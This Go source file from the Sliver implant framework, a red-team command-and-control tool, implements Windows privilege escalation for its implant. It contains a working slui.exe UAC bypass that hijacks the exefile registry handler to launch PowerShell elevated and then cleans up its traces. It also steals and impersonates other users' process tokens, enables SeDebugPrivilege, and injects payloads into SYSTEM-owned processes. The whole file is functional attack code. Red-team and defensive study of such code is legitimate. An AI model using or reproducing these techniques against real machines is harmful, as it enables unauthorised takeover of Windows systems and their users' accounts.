// +build windows

package priv

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Debug}}
	"log"
	// {{end}}
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"time"
	"unsafe"
	"syscall"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"

	"github.com/bishopfox/sliver/sliver/ps"
	"github.com/bishopfox/sliver/sliver/taskrunner"
	"github.com/bishopfox/sliver/sliver/syscalls"
)

const (

	THREAD_ALL_ACCESS = windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xffff
)

func SePrivEnable(s string) error {
	var tokenHandle windows.Token
	thsHandle, err := windows.GetCurrentProcess()
	if err != nil {
		return err
	}
	windows.OpenProcessToken(
		//r, a, e := procOpenProcessToken.Call(
		thsHandle,                       //  HANDLE  ProcessHandle,
		windows.TOKEN_ADJUST_PRIVILEGES, //	DWORD   DesiredAccess,
		&tokenHandle,                    //	PHANDLE TokenHandle
	)
	var luid windows.LUID
	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr(s), &luid)
	if err != nil {
		// {{if .Debug}}
		log.Println("LookupPrivilegeValueW failed", err)
		// {{end}}
		return err
	}
	privs := windows.Tokenprivileges{}
	privs.PrivilegeCount = 1
	privs.Privileges[0].Luid = luid
	privs.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED
	err = windows.AdjustTokenPrivileges(tokenHandle, false, &privs, 0, nil, nil)
	if err != nil {
		// {{if .Debug}}
		log.Println("AdjustTokenPrivileges failed", err)
		// {{end}}
		return err
	}
	return nil
}

func getPrimaryToken(pid uint32) (*windows.Token, error) {
	handle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, true, pid)
	if err != nil {
		// {{if .Debug}}
		log.Println("OpenProcess failed")
		// {{end}}
		return nil, err
	}
	defer windows.CloseHandle(handle)
	var token windows.Token
	if err = windows.OpenProcessToken(handle, windows.TOKEN_DUPLICATE|windows.TOKEN_ASSIGN_PRIMARY|windows.TOKEN_QUERY, &token); err != nil {
		// {{if .Debug}}
		log.Println("OpenProcessToken failed")
		// {{end}}
		return nil, err
	}
	return &token, err
}

func enableCurrentThreadPrivilege(privilegeName string) error {
	ct, err := windows.GetCurrentThread()
	if err != nil {
		// {{if .Debug}}
		log.Println("GetCurrentThread failed", err)
		// {{end}}
		return err
	}
	var t windows.Token
	err = windows.OpenThreadToken(ct, windows.TOKEN_QUERY|windows.TOKEN_ADJUST_PRIVILEGES, true, &t)
	if err != nil {
		// {{if .Debug}}
		log.Println("openThreadToken failed", err)
		// {{end}}
		return err
	}
	defer windows.CloseHandle(windows.Handle(t))

	var tp windows.Tokenprivileges

	privStr, err := windows.UTF16PtrFromString(privilegeName)
	if err != nil {
		return err
	}
	err = windows.LookupPrivilegeValue(nil, privStr, &tp.Privileges[0].Luid)
	if err != nil {
		// {{if .Debug}}
		log.Println("lookupPrivilegeValue failed")
		// {{end}}
		return err
	}
	tp.PrivilegeCount = 1
	tp.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED
	return windows.AdjustTokenPrivileges(t, false, &tp, 0, nil, nil)
}

func impersonateProcess(pid uint32) (newToken windows.Token, err error) {
	var attr windows.SecurityAttributes
	var requiredPrivileges = []string{"SeAssignPrimaryTokenPrivilege", "SeIncreaseQuotaPrivilege"}
	primaryToken, err := getPrimaryToken(pid)

	if err != nil {
		// {{if .Debug}}
		log.Println("getPrimaryToken failed:", err)
		// {{end}}
		return
	}
	defer primaryToken.Close()

	err = syscalls.ImpersonateLoggedOnUser(*primaryToken)
	if err != nil {
		// {{if .Debug}}
		log.Println("impersonateLoggedOnUser failed:", err)
		// {{end}}
		return
	}
	err = windows.DuplicateTokenEx(*primaryToken, windows.TOKEN_ALL_ACCESS, &attr, windows.SecurityDelegation, windows.TokenPrimary, &newToken)
	if err != nil {
		// {{if .Debug}}
		log.Println("duplicateTokenEx failed:", err)
		// {{end}}
		return
	}
	for _, priv := range requiredPrivileges {
		err = enableCurrentThreadPrivilege(priv)
		if err != nil {
			// {{if .Debug}}
			log.Println("Failed to set priv", priv)
			// {{end}}
			return
		}
	}
	return
}

func impersonateUser(username string) (token windows.Token, err error) {
	if username == "" {
		err = fmt.Errorf("username can't be empty")
		return
	}
	p, err := ps.Processes()
	if err != nil {
		return
	}
	for _, proc := range p {
		if proc.Owner() == username {
			token, err = impersonateProcess(uint32(proc.Pid()))
			// {{if .Debug}}
			log.Printf("[%d] %s\n", proc.Pid(), proc.Executable())
			// {{end}}
			if err == nil {
				// {{if .Debug}}
				log.Println("Got system token for process", proc.Pid(), proc.Executable())
				// {{end}}
				return
			}
		}
	}
	windows.RevertToSelf()
	err = fmt.Errorf("Could not acquire a token belonging to %s", username)
	return
}

func createRegistryKey(keyPath string) error {
	_, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		return err
	}

	return nil
}

func deleteRegistryKey(keyPath, keyName string) (err error) {
	key, err := registry.OpenKey(registry.CURRENT_USER, keyPath, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		return
	}
	err = registry.DeleteKey(key, keyName)
	return
}

func bypassUAC(command string) (err error) {
	regKeyStr := `Software\Classes\exefile\shell\open\command`
	createRegistryKey(regKeyStr)
	key, err := registry.OpenKey(registry.CURRENT_USER, regKeyStr, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		return err
	}
	command = "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -c " + command
	err = key.SetStringValue("", command)
	if err != nil {
		return
	}
	cleanup := func() {
		// Wait for the command to trigger
		time.Sleep(time.Second * 3)
		// Clean up
		// {{if .Debug}}
		log.Println("cleaning the registry up")
		// {{end}}
		err = deleteRegistryKey(`Software\Classes\exefile\shell\open`, "command")
		err = deleteRegistryKey(`Software\Classes\exefile\shell\`, "open")
	}
	shell32 := windows.MustLoadDLL("Shell32.dll")
	shellExecuteW := shell32.MustFindProc("ShellExecuteW")
	runasStr, _ := windows.UTF16PtrFromString("runas")
	sluiStr, _ := windows.UTF16PtrFromString(`C:\Windows\System32\slui.exe`)
	r1, _, err := shellExecuteW.Call(uintptr(0), uintptr(unsafe.Pointer(runasStr)), uintptr(unsafe.Pointer(sluiStr)), uintptr(0), uintptr(0), uintptr(1))
	if r1 < 32 {
		cleanup()
		return
	}
	cleanup()
	return
}

// RunProcessAsUser - Retrieve a primary token belonging to username
// and starts a new process using that token.
func RunProcessAsUser(username, command, args string) (out string, err error) {
	go func(out string) {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		token, err := impersonateUser(username)
		if err != nil {
			// {{if .Debug}}
			log.Println("Could not impersonate user", username)
			// {{end}}
			return
		}
		cmd := exec.Command(command, args)
		cmd.SysProcAttr = &windows.SysProcAttr{
			Token: syscall.Token(token),
		}
		// {{if .Debug}}
		log.Printf("Starting %s as %s\n", command, username)
		// {{end}}
		output, err := cmd.Output()
		if err != nil {
			// {{if .Debug}}
			log.Println("Command failed:", err)
			// {{end}}
			return
		}
		out = string(output)
	}(out)
	return
}

// Elevate - Starts a new sliver session in an elevated context
// Uses the slui UAC bypass
func Elevate() (err error) {
	processName, _ := os.Executable()
	err = bypassUAC(processName)
	if err != nil {
		// {{if .Debug}}
		log.Println("BypassUAC failed:", err)
		// {{end}}
	}
	return
}

// GetSystem starts a new RemoteTask in a SYSTEM owned process
func GetSystem(data []byte, hostingProcess string) (err error) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	procs, _ := ps.Processes()
	for _, p := range procs {
		if p.Executable() == hostingProcess {
			err = SePrivEnable("SeDebugPrivilege")
			if err != nil {
				// {{if .Debug}}
				log.Println("SePrivEnable failed:", err)
				// {{end}}
				return
			}
			err = taskrunner.RemoteTask(p.Pid(), data, false)
			if err != nil {
				// {{if .Debug}}
				log.Println("RemoteTask failed:", err)
				// {{end}}
				return
			}
			break
		}
	}
	return
}
